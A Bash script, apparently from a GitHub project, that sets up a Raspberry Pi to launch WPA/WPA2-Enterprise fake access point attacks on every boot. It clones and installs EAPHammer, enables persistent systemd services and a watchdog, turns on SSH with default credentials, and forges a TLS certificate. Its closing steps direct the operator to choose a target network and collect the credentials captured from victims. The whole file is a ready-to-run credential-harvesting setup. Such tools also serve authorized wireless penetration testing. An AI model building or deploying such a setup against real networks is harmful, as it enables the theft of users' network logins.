#!/usr/bin/env bash

# EAPgrade is a simple Bash script that upgrades your fresh Pi OS installation so that it launches WPA/WPA2-MGT fake AP attacks automatically after booting
#
# author - mamatb (t.me/m_amatb)
# location - https://github.com/mamatb/EAPgrade
# style guide - https://google.github.io/styleguide/shellguide.html

# TODO
#
# limit the maximum line length
# grep interface names instead of assuming 'wlan0' and 'wlan1'
# make use of 5ghz and channel bonding

readonly EAPGRADE_DIR="$(realpath 'EAPgrade')"
readonly EAPGRADE_LOG='/tmp/EAPgrade.log'
readonly EAPHAMMER_DIR='/opt/eaphammer'

# root access check
if [ "${UID}" != '0' ]
then
    echo '[!] root access needed to install EAPhammer' >&2
    exit 1
else
    echo '[+] root access confirmed, proceeding' >&2
fi

# github access check
if ! curl 'https://github.com' --max-time '4' &> '/dev/null'
then
    echo '[!] internet access and name resolution needed to clone EAPHammer' >&2
    exit 1
else
    echo '[+] internet access and name resolution confirmed, proceeding' >&2
fi

# git installation check
if ! command -v 'git' &> '/dev/null'
then
    echo '[!] git installation needed to clone EAPHammer' >&2
    exit 1
else
    echo '[+] git installation confirmed, proceeding' >&2
fi

# Pi OS update and upgrade
echo '[+] updating and upgrading Pi OS, this may take a while (progress @ "tail -f '"${EAPGRADE_LOG}"'")' >&2
DEBIAN_FRONTEND=noninteractive apt --yes update &> "${EAPGRADE_LOG}"
DEBIAN_FRONTEND=noninteractive apt --yes upgrade &> "${EAPGRADE_LOG}"
DEBIAN_FRONTEND=noninteractive apt --yes autoremove &> "${EAPGRADE_LOG}"

# EAPHammer git clone
echo '[+] cloning EAPHammer to "'"${EAPHAMMER_DIR}"'"' >&2
cd '/opt/'
git clone 'https://github.com/s0lst1c3/eaphammer.git' &> '/dev/null'
cd "${EAPHAMMER_DIR}"

# file movement
echo '[+] moving files to "'"${EAPHAMMER_DIR}"'"' >&2
cp --force "${EAPGRADE_DIR}/eaphammer.sh" "${EAPGRADE_DIR}/eaphammer.service" "${EAPGRADE_DIR}/eaphammer_watchdog.sh" "${EAPGRADE_DIR}/eaphammer_watchdog.service" "${EAPHAMMER_DIR}"

# EAPHammer installation
echo '[+] installing EAPHammer, this may take a while (progress @ "tail -f '"${EAPGRADE_LOG}"'")' >&2
sed --in-place '/python3-pywebcopy/d' "${EAPHAMMER_DIR}/raspbian-dependencies.txt"
echo -e 'y\n' | ./raspbian-setup &> "${EAPGRADE_LOG}"

# eaphammer.service activation
echo '[+] enabling eaphammer.service to launch EAPHammer automatically after booting' >&2
cp --force "${EAPHAMMER_DIR}/eaphammer.service" '/lib/systemd/system/eaphammer.service'
systemctl --quiet enable 'eaphammer.service'
chmod +x "${EAPHAMMER_DIR}/eaphammer.sh"

# eaphammer_watchdog.service activation
echo '[+] enabling eaphammer_watchdog.service to restart EAPHammer when unstable' >&2
cp --force "${EAPHAMMER_DIR}/eaphammer_watchdog.service" '/lib/systemd/system/eaphammer_watchdog.service'
systemctl --quiet enable 'eaphammer_watchdog.service'
chmod +x "${EAPHAMMER_DIR}/eaphammer_watchdog.sh"

# ssh.service activation
echo '[+] enabling ssh.service to manage Pi OS from the local network' >&2
systemctl --quiet enable 'ssh.service'

# EAPHammer credentials configuration
echo '[+] setting up credentials "EAPgrade:changeme" to access the fake AP network' >&2
./ehdb --delete --delete-all
./ehdb --add --identity 'EAPgrade' --password 'changeme'

# EAPHammer certificate generation
echo '[+] generating fake TLS certificate to use with EAPHammer' >&2
python3 eaphammer --bootstrap --cn 'hotspot.eapgrade.org' --country 'ES' --state 'Madrid' --locale 'Madrid' --org 'eapgrade' --org-unit 'IT' --email 'administrator@eapgrade.org' &> '/dev/null'

# final steps
echo '[+] done, now the WPA/WPA2-MGT fake AP attack should launch automatically after booting. Recommended next steps:' >&2
echo '    - modify the credentials to access the fake AP network @ "'"${EAPHAMMER_DIR}"'/db/phase2.accounts"' >&2
echo '    - modify EAPHammer parameters like the target ESSID @ "'"${EAPHAMMER_DIR}"'/eaphammer.sh"' >&2
echo '    - delete "'"${EAPHAMMER_DIR}"'/certs/server/*", "'"${EAPHAMMER_DIR}"'/certs/ca/*" and "'"${EAPHAMMER_DIR}"'/certs/active/*";'
echo '      then generate your own target certificate with "python3 '"${EAPHAMMER_DIR}"'/eaphammer --cert-wizard"' >&2
echo '    - check for captured credentials after each attack @ "'"${EAPHAMMER_DIR}"'/logs/hostapd-eaphammer.raw"' >&2

exit 0

